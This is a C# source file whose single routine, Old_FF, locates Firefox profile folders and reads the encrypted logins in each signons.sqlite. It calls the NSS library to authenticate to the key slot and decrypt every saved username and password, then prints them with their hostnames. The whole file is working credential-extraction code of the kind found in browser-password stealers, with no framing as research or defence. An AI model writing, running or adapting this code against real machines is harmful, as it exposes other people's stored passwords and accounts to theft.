using System.Data;
using System.Data.SQLite;
using System.IO;

namespace MozillaDecrypt
{
    public class GetPassword
    {
        public static void Old_FF()
        {
            foreach (string dir in Directory.GetDirectories(PathFireFox.GetRandomFF()))
            {
                string signonsFile = Path.Combine(dir, "signons.sqlite");
                if (File.Exists(signonsFile))
                {
                    DecMozilla.NSS_Init(dir);
                    DecMozilla.PK11_Authenticate(DecMozilla.PK11_GetInternalKeySlot(), true, 0);
                    using (var Connect = new SQLiteConnection($"Data Source={signonsFile};Version=3;New=False;Compress=True;"))
                    {
                        using (var ComText = new SQLiteCommand("SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins", Connect))
                        {
                            Connect.Open();
                            ComText.CommandType = CommandType.Text;
                            using (var reader = ComText.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    string Link = reader.GetString(2);
                                    string UserName = DecMozilla.Decrypt(reader.GetString(0));
                                    string Password = DecMozilla.Decrypt(reader.GetString(1));

                                    System.Console.WriteLine(Link);
                                    System.Console.WriteLine(UserName);
                                    System.Console.WriteLine(Password);
                                }
                            }
                        }
                    }
                    //              0      1        2             3              4             5              6                7                 8     9
                    // moz_logins (id, hostname, httpRealm, formSubmitURL, usernameField, passwordField, encryptedUsername, encryptedPassword, guid, encType)
                }
            }
        }
    }
}